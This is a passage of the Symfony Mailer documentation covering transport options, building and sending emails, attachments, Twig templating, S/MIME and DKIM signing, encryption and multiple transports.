or using the\n``setAuthenticators()`` method::\n\n    use Symfony\\Component\\Mailer\\Transport\\Smtp\\Auth\\XOAuth2Authenticator;\n    use Symfony\\Component\\Mailer\\Transport\\Smtp\\EsmtpTransport;\n\n    // Choose one of these two options:\n\n    // Option 1: pass the authenticators to the constructor\n    $transport = new EsmtpTransport(\n        host: 'oauth-smtp.domain.tld',\n        authenticators: [new XOAuth2Authenticator()]\n    );\n\n    // Option 2: call a method to redefine the authenticators\n    $transport->setAuthenticators([new XOAuth2Authenticator()]);\n\nOther Options\n~~~~~~~~~~~~~\n\n``command``\n    Command to be executed by ``sendmail`` transport::\n\n        $dsn = 'sendmail://default?command=/usr/sbin/sendmail%20-oi%20-t'\n\n``local_domain``\n    The domain name to use in ``HELO`` command::\n\n        $dsn = 'smtps://smtp.example.com?local_domain=example.org'\n\n``restart_threshold``\n    The maximum number of messages to send before re-starting the transport. It\n    can be used together with ``restart_threshold_sleep``::\n\n        $dsn = 'smtps://smtp.example.com?restart_threshold=10&restart_threshold_sleep=1'\n\n``restart_threshold_sleep``\n    The number of seconds to sleep between stopping and re-starting the transport.\n    It's common to combine it with ``restart_threshold``::\n\n        $dsn = 'smtps://smtp.example.com?restart_threshold=10&restart_threshold_sleep=1'\n\n``ping_threshold``\n    The minimum number of seconds between two messages required to ping the server::\n\n        $dsn = 'smtps://smtp.example.com?ping_threshold=200'\n\n``max_per_second``\n    The number of messages to send per second (0 to disable this limitation)::\n\n        $dsn = 'smtps://smtp.example.com?max_per_second=2'\n\nCustom Transport Factories\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you want to support your own custom DSN (``acme://...``), you can create a\ncustom transport factory. To do so, create a class that implements\n:class:`Symfony\\\\Component\\\\Mailer\\\\Transport\\\\TransportFactoryInterface` or, if\nyou prefer, extend the :class:`Symfony\\\\Component\\\\Mailer\\\\Transport\\\\AbstractTransportFactory`\nclass to save some boilerplate code::\n\n    // src/Mailer/AcmeTransportFactory.php\n    final class AcmeTransportFactory extends AbstractTransportFactory\n    {\n        public function create(Dsn $dsn): TransportInterface\n        {\n            // parse the given DSN, extract data/credentials from it\n            // and then, create and return the transport\n        }\n\n        protected function getSupportedSchemes(): array\n        {\n            // this supports DSN starting with `acme://`\n            return ['acme'];\n        }\n    }\n\nAfter creating the custom transport class, register it as a service in your\napplication and :doc:`tag it </service_container/tags>` with the\n``mailer.transport_factory`` tag.\n\nCreating & Sending Messages\n---------------------------\n\nTo send an email, get a :class:`Symfony\\\\Component\\\\Mailer\\\\Mailer`\ninstance by type-hinting :class:`Symfony\\\\Component\\\\Mailer\\\\MailerInterface`\nand create an :class:`Symfony\\\\Component\\\\Mime\\\\Email` object::\n\n    // src/Controller/MailerController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Mailer\\MailerInterface;\n    use Symfony\\Component\\Mime\\Email;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class MailerController extends AbstractController\n    {\n        #[Route('/email')]\n        public function sendEmail(MailerInterface $mailer): Response\n        {\n            $email = (new Email())\n                ->from('hello@example.com')\n                ->to('you@example.com')\n                //->cc('cc@example.com')\n                //->bcc('bcc@example.com')\n                //->replyTo('fabien@example.com')\n                //->priority(Email::PRIORITY_HIGH)\n                ->subject('Time for Symfony Mailer!')\n                ->text('Sending emails is fun again!')\n                ->html('<p>See Twig integration for better HTML integration!</p>');\n\n            $mailer->send($email);\n\n            // ...\n        }\n    }\n\nThat's it! The message will be sent immediately via the transport you configured.\nIf you prefer to send emails asynchronously to improve performance, read the\n:ref:`Sending Messages Async <mailer-sending-messages-async>` section. Also, if\nyour application has the :doc:`Messenger component </messenger>` installed, all\nemails will be sent asynchronously by default\n(but :ref:`you can change that <messenger-handling-messages-synchronously>`).\n\nEmail Addresses\n~~~~~~~~~~~~~~~\n\nAll the methods that require email addresses (``from()``, ``to()``, etc.) accept\nboth strings or address objects::\n\n    // ...\n    use Symfony\\Component\\Mime\\Address;\n\n    $email = (new Email())\n        // email address as a simple string\n        ->from('fabien@example.com')\n\n        // email address as an object\n        ->from(new Address('fabien@example.com'))\n\n        // defining the email address and name as an object\n        // (email clients will display the name)\n        ->from(new Address('fabien@example.com', 'Fabien'))\n\n        // defining the email address and name as a string\n        // (the format must match: 'Name <email@example.com>')\n        ->from(Address::create('Fabien Potencier <fabien@example.com>'))\n\n        // ...\n    ;\n\n.. tip::\n\n    Instead of calling ``->from()`` *every* time you create a new email, you can\n    :ref:`configure emails globally <mailer-configure-email-globally>` to set the\n    same ``From`` email to all messages.\n\n.. note::\n\n    The local part of the address (what goes before the ``@``) can include UTF-8\n    characters, except for the sender address (to avoid issues with bounced emails).\n    For example: ``föóbàr@example.com``, ``用户@example.com``, ``θσερ@example.com``, etc.\n\nUse ``addTo()``, ``addCc()``, or ``addBcc()`` methods to add more addresses::\n\n    $email = (new Email())\n        ->to('foo@example.com')\n        ->addTo('bar@example.com')\n        ->cc('cc@example.com')\n        ->addCc('cc2@example.com')\n\n        // ...\n    ;\n\nAlternatively, you can pass multiple addresses to each method::\n\n    $toAddresses = ['foo@example.com', new Address('bar@example.com')];\n\n    $email = (new Email())\n        ->to(...$toAddresses)\n        ->cc('cc1@example.com', 'cc2@example.com')\n\n        // ...\n    ;\n\nMessage Headers\n~~~~~~~~~~~~~~~\n\nMessages include a number of header fields to describe their contents. Symfony\nsets all the required headers automatically, but you can set your own headers\ntoo. There are different types of headers (Id header, Mailbox header, Date\nheader, etc.) but most of the times you'll set text headers::\n\n    $email = (new Email())\n        ->getHeaders()\n            // this non-standard header tells compliant autoresponders (\"email holiday mode\") to not\n            // reply to this message because it's an automated email\n            ->addTextHeader('X-Auto-Response-Suppress', 'OOF, DR, RN, NRN, AutoReply')\n\n            // use an array if you want to add a header with multiple values\n            // (for example in the \"References\" or \"In-Reply-To\" header)\n            ->addIdHeader('References', ['123@example.com', '456@example.com'])\n\n            // ...\n    ;\n\n.. tip::\n\n    Instead of calling ``->addTextHeader()`` *every* time you create a new email, you can\n    :ref:`configure emails globally <mailer-configure-email-globally>` to set the same\n    headers to all sent emails.\n\nMessage Contents\n~~~~~~~~~~~~~~~~\n\nThe text and HTML contents of the email messages can be strings (usually the\nresult of rendering some template) or PHP resources::\n\n    $email = (new Email())\n        // ...\n        // simple contents defined as a string\n        ->text('Lorem ipsum...')\n        ->html('<p>Lorem ipsum...</p>')\n\n        // attach a file stream\n        ->text(fopen('/path/to/emails/user_signup.txt', 'r'))\n        ->html(fopen('/path/to/emails/user_signup.html', 'r'))\n    ;\n\n.. tip::\n\n    You can also use Twig templates to render the HTML and text contents. Read\n    the `Twig: HTML & CSS`_ section later in this article to\n    learn more.\n\nFile Attachments\n~~~~~~~~~~~~~~~~\n\nUse the ``addPart()`` method with a ``File`` to add files that exist on your\nfile system::\n\n    use Symfony\\Component\\Mime\\Part\\DataPart;\n    use Symfony\\Component\\Mime\\Part\\File;\n    // ...\n\n    $email = (new Email())\n        // ...\n        ->addPart(new DataPart(new File('/path/to/documents/terms-of-use.pdf')))\n        // optionally you can tell email clients to display a custom name for the file\n        ->addPart(new DataPart(new File('/path/to/documents/privacy.pdf'), 'Privacy Policy'))\n        // optionally you can provide an explicit MIME type (otherwise it's guessed)\n        ->addPart(new DataPart(new File('/path/to/documents/contract.doc'), 'Contract', 'application/msword'))\n    ;\n\nAlternatively you can attach contents from a stream by passing it directly to\nthe ``DataPart``::\n\n    $email = (new Email())\n        // ...\n        ->addPart(new DataPart(fopen('/path/to/documents/contract.doc', 'r')))\n    ;\n\nEmbedding Images\n~~~~~~~~~~~~~~~~\n\nIf you want to display images inside your email, you must embed them\ninstead of adding them as attachments. When using Twig to render the email\ncontents, as explained :ref:`later in this article <mailer-twig-embedding-images>`,\nthe images are embedded automatically. Otherwise, you need to embed them manually.\n\nFirst, use the ``addPart()`` method to add an image from a\nfile or stream::\n\n    $email = (new Email())\n        // ...\n        // get the image contents from a PHP resource\n        ->addPart((new DataPart(fopen('/path/to/images/logo.png', 'r'), 'logo', 'image/png'))->asInline())\n        // get the image contents from an existing file\n        ->addPart((new DataPart(new File('/path/to/images/signature.gif'), 'footer-signature', 'image/gif'))->asInline())\n    ;\n\nUse the ``asInline()`` method to embed the content instead of attaching it.\n\nThe second optional argument of both methods is the image name (\"Content-ID\" in\nthe MIME standard). Its value is an arbitrary string that must be unique in each\nemail message and is used later to reference the images inside the HTML contents::\n\n    $email = (new Email())\n        // ...\n        ->addPart((new DataPart(fopen('/path/to/images/logo.png', 'r'), 'logo', 'image/png'))->asInline())\n        ->addPart((new DataPart(new File('/path/to/images/signature.gif'), 'footer-signature', 'image/gif'))->asInline())\n\n        // reference images using the syntax 'cid:' + \"image embed name\"\n        ->html('<img src=\"cid:logo\"> ... <img src=\"cid:footer-signature\"> ...')\n\n        // use the same syntax for images included as HTML background images\n        ->html('... <div background=\"cid:footer-signature\"> ... </div> ...')\n    ;\n\nThe actual Content-ID value present in the e-mail source will be randomly generated by Symfony.\nYou can also use the :method:`DataPart::setContentId() <Symfony\\\\Component\\\\Mime\\\\Part\\\\DataPart::setContentId>`\nmethod to define a custom Content-ID for the image and use it as its ``cid`` reference::\n\n    $part = new DataPart(new File('/path/to/images/signature.gif'));\n    // according to the spec, the Content-ID value must include at least one '@' character\n    $part->setContentId('footer-signature@my-app');\n\n    $email = (new Email())\n        // ...\n        ->addPart($part->asInline())\n        ->html('... <img src=\"cid:footer-signature@my-app\"> ...')\n    ;\n\n.. _mailer-configure-email-globally:\n\nConfiguring Emails Globally\n---------------------------\n\nInstead of calling ``->from()`` on each Email you create, you can configure this\nvalue globally so that it is set on all sent emails. The same is true with ``->to()``\nand headers.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        framework:\n            mailer:\n                envelope:\n                    sender: 'fabien@example.com'\n                    recipients: ['foo@example.com', 'bar@example.com']\n                headers:\n                    From: 'Fabien <fabien@example.com>'\n                    Bcc: 'baz@example.com'\n                    X-Custom-Header: 'foobar'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:mailer>\n                    <framework:envelope>\n                        <framework:sender>fabien@example.com</framework:sender>\n                        <framework:recipients>foo@example.com</framework:recipients>\n                        <framework:recipients>bar@example.com</framework:recipients>\n                    </framework:envelope>\n                    <framework:header name=\"From\">Fabien &lt;fabien@example.com&gt;</framework:header>\n                    <framework:header name=\"Bcc\">baz@example.com</framework:header>\n                    <framework:header name=\"X-Custom-Header\">foobar</framework:header>\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $mailer = $framework->mailer();\n            $mailer\n                ->envelope()\n                    ->sender('fabien@example.com')\n                    ->recipients(['foo@example.com', 'bar@example.com'])\n            ;\n\n            $mailer->header('From')->value('Fabien <fabien@example.com>');\n            $mailer->header('Bcc')->value('baz@example.com');\n            $mailer->header('X-Custom-Header')->value('foobar');\n        };\n\n.. warning::\n\n    Some third-party providers don't support the usage of keywords like ``from``\n    in the ``headers``. Check out your provider's documentation before setting\n    any global header.\n\nHandling Sending Failures\n-------------------------\n\nSymfony Mailer considers that sending was successful when your transport (SMTP\nserver or third-party provider) accepts the mail for further delivery. The message\ncan later be lost or not delivered because of some problem in your provider, but\nthat's out of reach for your Symfony application.\n\nIf there's an error when handing over the email to your transport, Symfony throws\na :class:`Symfony\\\\Component\\\\Mailer\\\\Exception\\\\TransportExceptionInterface`.\nCatch that exception to recover from the error or to display some message::\n\n    use Symfony\\Component\\Mailer\\Exception\\TransportExceptionInterface;\n\n    $email = new Email();\n    // ...\n    try {\n        $mailer->send($email);\n    } catch (TransportExceptionInterface $e) {\n        // some error prevented the email sending; display an\n        // error message or try to resend the message\n    }\n\nDebugging Emails\n----------------\n\nThe :class:`Symfony\\\\Component\\\\Mailer\\\\SentMessage` object returned by the\n``send()`` method of the :class:`Symfony\\\\Component\\\\Mailer\\\\Transport\\\\TransportInterface`\nprovides access to the original message (``getOriginalMessage()``) and to some\ndebug information (``getDebug()``) such as the HTTP calls done by the HTTP\ntransports, which is useful to debug errors.\n\n.. note::\n\n    If your code used :class:`Symfony\\\\Component\\\\Mailer\\\\MailerInterface`, you\n    need to replace it by :class:`Symfony\\\\Component\\\\Mailer\\\\Transport\\\\TransportInterface`\n    to have the ``SentMessage`` object returned.\n\n.. note::\n\n    Some mailer providers change the ``Message-Id`` when sending the email. The\n    ``getMessageId()`` method from ``SentMessage`` always returns the definitive\n    ID of the message (being the original random ID generated by Symfony or the\n    new ID generated by the mailer provider).\n\nThe exceptions related to mailer transports (those which implement\n:class:`Symfony\\\\Component\\\\Mailer\\\\Exception\\\\TransportException`) also provide\nthis debug information via the ``getDebug()`` method.\n\n.. _mailer-twig:\n\nTwig: HTML & CSS\n----------------\n\nThe Mime component integrates with the :ref:`Twig template engine <twig-language>`\nto provide advanced features such as CSS style inlining and support for HTML/CSS\nframeworks to create complex HTML email messages. First, make sure Twig is installed:\n\n.. code-block:: terminal\n\n    $ composer require symfony/twig-bundle\n\n    # or if you're using the component in a non-Symfony app:\n    # composer require symfony/twig-bridge\n\nHTML Content\n~~~~~~~~~~~~\n\nTo define the contents of your email with Twig, use the\n:class:`Symfony\\\\Bridge\\\\Twig\\\\Mime\\\\TemplatedEmail` class. This class extends\nthe normal :class:`Symfony\\\\Component\\\\Mime\\\\Email` class but adds some new methods\nfor Twig templates::\n\n    use Symfony\\Bridge\\Twig\\Mime\\TemplatedEmail;\n\n    $email = (new TemplatedEmail())\n        ->from('fabien@example.com')\n        ->to(new Address('ryan@example.com'))\n        ->subject('Thanks for signing up!')\n\n        // path of the Twig template to render\n        ->htmlTemplate('emails/signup.html.twig')\n\n        // change locale used in the template, e.g. to match user's locale\n        ->locale('de')\n\n        // pass variables (name => value) to the template\n        ->context([\n            'expiration_date' => new \\DateTime('+7 days'),\n            'username' => 'foo',\n        ])\n    ;\n\nThen, create the template:\n\n.. code-block:: html+twig\n\n    {# templates/emails/signup.html.twig #}\n    <h1>Welcome {{ email.toName }}!</h1>\n\n    <p>\n        You signed up as {{ username }} the following email:\n    </p>\n    <p><code>{{ email.to[0].address }}</code></p>\n\n    <p>\n        <a href=\"#\">Activate your account</a>\n        (this link is valid until {{ expiration_date|date('F jS') }})\n    </p>\n\nThe Twig template has access to any of the parameters passed in the ``context()``\nmethod of the ``TemplatedEmail`` class and also to a special variable called\n``email``, which is an instance of\n:class:`Symfony\\\\Bridge\\\\Twig\\\\Mime\\\\WrappedTemplatedEmail`.\n\nText Content\n~~~~~~~~~~~~\n\nWhen the text content of a ``TemplatedEmail`` is not explicitly defined, it is\nautomatically generated from the HTML contents.\n\nSymfony uses the following strategy when generating the text version of an\nemail:\n\n* If an explicit HTML to text converter has been configured (see\n  :ref:`twig.mailer.html_to_text_converter\n  <config-twig-html-to-text-converter>`), it calls it;\n\n* If not, and if you have `league/html-to-markdown`_ installed in your\n  application, it uses it to turn HTML into Markdown (so the text email has\n  some visual appeal);\n\n* Otherwise, it applies the :phpfunction:`strip_tags` PHP function to the\n  original HTML contents.\n\nIf you want to define the text content yourself, use the ``text()`` method\nexplained in the previous sections or the ``textTemplate()`` method provided by\nthe ``TemplatedEmail`` class:\n\n.. code-block:: diff\n\n    +use Symfony\\Bridge\\Twig\\Mime\\TemplatedEmail;\n\n     $email = (new TemplatedEmail())\n         // ...\n\n         ->htmlTemplate('emails/signup.html.twig')\n    +     ->textTemplate('emails/signup.txt.twig')\n         // ...\n     ;\n\n.. _mailer-twig-embedding-images:\n\nEmbedding Images\n~~~~~~~~~~~~~~~~\n\nInstead of dealing with the ``<img src=\"cid: ...\">`` syntax explained in the\nprevious sections, when using Twig to render email contents you can refer to\nimage files as usual. First, to simplify things, define a Twig namespace called\n``images`` that points to whatever directory your images are stored in:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n\n            paths:\n                # point this wherever your images live\n                '%kernel.project_dir%/assets/images': images\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n\n                <!-- point this wherever your images live -->\n                <twig:path namespace=\"images\">%kernel.project_dir%/assets/images</twig:path>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            // point this wherever your images live\n            $twig->path('%kernel.project_dir%/assets/images', 'images');\n        };\n\nNow, use the special ``email.image()`` Twig helper to embed the images inside\nthe email contents:\n\n.. code-block:: html+twig\n\n    {# '@images/' refers to the Twig namespace defined earlier #}\n    <img src=\"{{ email.image('@images/logo.png') }}\" alt=\"Logo\">\n\n    <h1>Welcome {{ email.toName }}!</h1>\n    {# ... #}\n\n.. _mailer-inline-css:\n\nInlining CSS Styles\n~~~~~~~~~~~~~~~~~~~\n\nDesigning the HTML contents of an email is very different from designing a\nnormal HTML page. For starters, most email clients only support a subset of all\nCSS features. In addition, popular email clients like Gmail don't support\ndefining styles inside ``<style> ... </style>`` sections and you must **inline\nall the CSS styles**.\n\nCSS inlining means that every HTML tag must define a ``style`` attribute with\nall its CSS styles. This can make organizing your CSS a mess. That's why Twig\nprovides a ``CssInlinerExtension`` that automates everything for you. Install\nit with:\n\n.. code-block:: terminal\n\n    $ composer require twig/extra-bundle twig/cssinliner-extra\n\nThe extension is enabled automatically. To use it, wrap the entire template\nwith the ``inline_css`` filter:\n\n.. code-block:: html+twig\n\n    {% apply inline_css %}\n        <style>\n            {# here, define your CSS styles as usual #}\n            h1 {\n                color: #333;\n            }\n        </style>\n\n        <h1>Welcome {{ email.toName }}!</h1>\n        {# ... #}\n    {% endapply %}\n\nUsing External CSS Files\n........................\n\nYou can also define CSS styles in external files and pass them as\narguments to the filter:\n\n.. code-block:: html+twig\n\n    {% apply inline_css(source('@styles/email.css')) %}\n        <h1>Welcome {{ username }}!</h1>\n        {# ... #}\n    {% endapply %}\n\nYou can pass unlimited number of arguments to ``inline_css()`` to load multiple\nCSS files. For this example to work, you also need to define a new Twig namespace\ncalled ``styles`` that points to the directory where ``email.css`` lives:\n\n.. _mailer-css-namespace:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n\n            paths:\n                # point this wherever your css files live\n                '%kernel.project_dir%/assets/styles': styles\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n\n                <!-- point this wherever your css files live -->\n                <twig:path namespace=\"styles\">%kernel.project_dir%/assets/styles</twig:path>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            // point this wherever your css files live\n            $twig->path('%kernel.project_dir%/assets/styles', 'styles');\n        };\n\n.. _mailer-markdown:\n\nRendering Markdown Content\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTwig provides another extension called ``MarkdownExtension`` that lets you\ndefine the email contents using `Markdown syntax`_. To use this, install the\nextension and a Markdown conversion library (the extension is compatible with\nseveral popular libraries):\n\n.. code-block:: terminal\n\n    # instead of league/commonmark, you can also use erusev/parsedown or michelf/php-markdown\n    $ composer require twig/extra-bundle twig/markdown-extra league/commonmark\n\nThe extension adds a ``markdown_to_html`` filter, which you can use to convert parts or\nthe entire email contents from Markdown to HTML:\n\n.. code-block:: twig\n\n    {% apply markdown_to_html %}\n        Welcome {{ email.toName }}!\n        ===========================\n\n        You signed up to our site using the following email:\n        `{{ email.to[0].address }}`\n\n        [Activate your account]({{ url('...') }})\n    {% endapply %}\n\n.. _mailer-inky:\n\nInky Email Templating Language\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nCreating beautifully designed emails that work on every email client is so\ncomplex that there are HTML/CSS frameworks dedicated to that. One of the most\npopular frameworks is called `Inky`_. It defines a syntax based on some HTML-like\ntags which are later transformed into the real HTML code sent to users:\n\n.. code-block:: html\n\n    <!-- a simplified example of the Inky syntax -->\n    <container>\n        <row>\n            <columns>This is a column.</columns>\n        </row>\n    </container>\n\nTwig provides integration with Inky via the ``InkyExtension``. First, install\nthe extension in your application:\n\n.. code-block:: terminal\n\n    $ composer require twig/extra-bundle twig/inky-extra\n\nThe extension adds an ``inky_to_html`` filter, which can be used to convert\nparts or the entire email contents from Inky to HTML:\n\n.. code-block:: html+twig\n\n    {% apply inky_to_html %}\n        <container>\n            <row class=\"header\">\n                <columns>\n                    <spacer size=\"16\"></spacer>\n                    <h1 class=\"text-center\">Welcome {{ email.toName }}!</h1>\n                </columns>\n\n                {# ... #}\n            </row>\n        </container>\n    {% endapply %}\n\nYou can combine all filters to create complex email messages:\n\n.. code-block:: twig\n\n    {% apply inky_to_html|inline_css(source('@styles/foundation-emails.css')) %}\n        {# ... #}\n    {% endapply %}\n\nThis makes use of the :ref:`styles Twig namespace <mailer-css-namespace>` we created\nearlier. You could, for example, `download the foundation-emails.css file`_\ndirectly from GitHub and save it in ``assets/styles``.\n\n.. _signing-and-encrypting-messages:\n\nSigning and Encrypting Messages\n-------------------------------\n\nIt's possible to sign and/or encrypt email messages to increase their\nintegrity/security. Both options can be combined to encrypt a signed message\nand/or to sign an encrypted message.\n\nBefore signing/encrypting messages, make sure to have:\n\n* The `OpenSSL PHP extension`_ properly installed and configured;\n* A valid `S/MIME`_ security certificate.\n\n.. tip::\n\n    When using OpenSSL to generate certificates, make sure to add the\n    ``-addtrust emailProtection`` command option.\n\n.. warning::\n\n    Signing and encrypting messages require their contents to be fully rendered.\n    For example, the content of :ref:`templated emails <mailer-twig>` is rendered\n    by a :class:`Symfony\\\\Component\\\\Mailer\\\\EventListener\\\\MessageListener`.\n    So, if you want to sign and/or encrypt such a message, you need to do it in\n    a :ref:`MessageEvent <messageevent>` listener run after it (you need to set\n    a negative priority to your listener).\n\nSigning Messages\n~~~~~~~~~~~~~~~~\n\nWhen signing a message, a cryptographic hash is generated for the entire content\nof the message (including attachments). This hash is added as an attachment so\nthe recipient can validate the integrity of the received message. However, the\ncontents of the original message are still readable for mailing agents not\nsupporting signed messages, so you must also encrypt the message if you want to\nhide its contents.\n\nYou can sign messages using either ``S/MIME`` or ``DKIM``. In both cases, the\ncertificate and private key must be `PEM encoded`_, and can be either created\nusing for example OpenSSL or obtained at an official Certificate Authority (CA).\nThe email recipient must have the CA certificate in the list of trusted issuers\nin order to verify the signature.\n\n.. warning::\n\n    If you use message signature, sending to ``Bcc`` will be removed from the\n    message. If you need to send a message to multiple recipients, you need\n    to compute a new signature for each recipient.\n\nS/MIME Signer\n.............\n\n`S/MIME`_ is a standard for public key encryption and signing of MIME data. It\nrequires using both a certificate and a private key::\n\n    use Symfony\\Component\\Mime\\Crypto\\SMimeSigner;\n    use Symfony\\Component\\Mime\\Email;\n\n    $email = (new Email())\n        ->from('hello@example.com')\n        // ...\n        ->html('...');\n\n    $signer = new SMimeSigner('/path/to/certificate.crt', '/path/to/certificate-private-key.key');\n    // if the private key has a passphrase, pass it as the third argument\n    // new SMimeSigner('/path/to/certificate.crt', '/path/to/certificate-private-key.key', 'the-passphrase');\n\n    $signedEmail = $signer->sign($email);\n    // now use the Mailer component to send this $signedEmail instead of the original email\n\n.. tip::\n\n    The ``SMimeSigner`` class defines other optional arguments to pass\n    intermediate certificates and to configure the signing process using a\n    bitwise operator options for :phpfunction:`openssl_pkcs7_sign` PHP function.\n\nDKIM Signer\n...........\n\n`DKIM`_ is an email authentication method that affixes a digital signature,\nlinked to a domain name, to each outgoing email messages. It requires a private\nkey but not a certificate::\n\n    use Symfony\\Component\\Mime\\Crypto\\DkimSigner;\n    use Symfony\\Component\\Mime\\Email;\n\n    $email = (new Email())\n        ->from('hello@example.com')\n        // ...\n        ->html('...');\n\n    // first argument: same as openssl_pkey_get_private(), either a string with the\n    // contents of the private key or the absolute path to it (prefixed with 'file://')\n    // second and third arguments: the domain name and \"selector\" used to perform a DNS lookup\n    // (the selector is a string used to point to a specific DKIM public key record in your DNS)\n    $signer = new DkimSigner('file:///path/to/private-key.key', 'example.com', 'sf');\n    // if the private key has a passphrase, pass it as the fifth argument\n    // new DkimSigner('file:///path/to/private-key.key', 'example.com', 'sf', [], 'the-passphrase');\n\n    $signedEmail = $signer->sign($email);\n    // now use the Mailer component to send this $signedEmail instead of the original email\n\n    // DKIM signer provides many config options and a helper object to configure them\n    use Symfony\\Component\\Mime\\Crypto\\DkimOptions;\n\n    $signedEmail = $signer->sign($email, (new DkimOptions())\n        ->bodyCanon('relaxed')\n        ->headerCanon('relaxed')\n        ->headersToIgnore(['Message-ID'])\n        ->toArray()\n    );\n\nEncrypting Messages\n~~~~~~~~~~~~~~~~~~~\n\nWhen encrypting a message, the entire message (including attachments) is\nencrypted using a certificate. Therefore, only the recipients that have the\ncorresponding private key can read the original message contents::\n\n    use Symfony\\Component\\Mime\\Crypto\\SMimeEncrypter;\n    use Symfony\\Component\\Mime\\Email;\n\n    $email = (new Email())\n        ->from('hello@example.com')\n        // ...\n        ->html('...');\n\n    $encrypter = new SMimeEncrypter('/path/to/certificate.crt');\n    $encryptedEmail = $encrypter->encrypt($email);\n    // now use the Mailer component to send this $encryptedEmail instead of the original email\n\nYou can pass more than one certificate to the ``SMimeEncrypter`` constructor\nand it will select the appropriate certificate depending on the ``To`` option::\n\n    $firstEmail = (new Email())\n        // ...\n        ->to('jane@example.com');\n\n    $secondEmail = (new Email())\n        // ...\n        ->to('john@example.com');\n\n    // the second optional argument of SMimeEncrypter defines which encryption algorithm is used\n    // (it must be one of these constants: https://www.php.net/manual/en/openssl.ciphers.php)\n    $encrypter = new SMimeEncrypter([\n        // key = email recipient; value = path to the certificate file\n        'jane@example.com' => '/path/to/first-certificate.crt',\n        'john@example.com' => '/path/to/second-certificate.crt',\n    ]);\n\n    $firstEncryptedEmail = $encrypter->encrypt($firstEmail);\n    $secondEncryptedEmail = $encrypter->encrypt($secondEmail);\n\n.. _multiple-email-transports:\n\nMultiple Email Transports\n-------------------------\n\nYou may want to use more than one mailer transport for delivery of your messages.\nThis can be configured by replacing the ``dsn`` configuration entry with a\n``transports`` entry, like:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        framework:\n            mailer:\n                transports:\n                    main: '%env(MAILER_DSN)%'\n                    alternative: '%env(MAILER_DSN_IMPORTANT)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:mailer>\n                    <framework:transport name=\"main\">%env(MAILER_DSN)%</framework:transport>\n                    <framework:transport name=\"alternative\">%env(MAILER_DSN_IMPORTANT)%</framework:transport>\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\env;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->mailer()\n                ->transport('main', env('MAILER_DSN'))\n                ->transport('alternative', env('MAILER_DSN_IMPORTANT'))\n            ;\n        };\n\nBy default the first transport is used. The other transports can be selected by\nadding an ``X-Transport`` header (which Mailer will remove automatically from\nthe final email)::\n\n    // Send using first transport (\"main\"):\n    $mailer->send($email);\n\n    // ... or use the transport \"alternative\":\n    $email->getHeaders()->addTextHeader('X-Transport', 'alternative');\n    $mailer->send($email);\n\n.. _mailer-sending-messages-async:\n\nSending Messages Async\n----------------------\n\nWhen you call ``$mailer->send($email)``, the email is sent to the transport immediately.\nTo improve performance, you can leverage :doc:`Messenger </messenger>` to 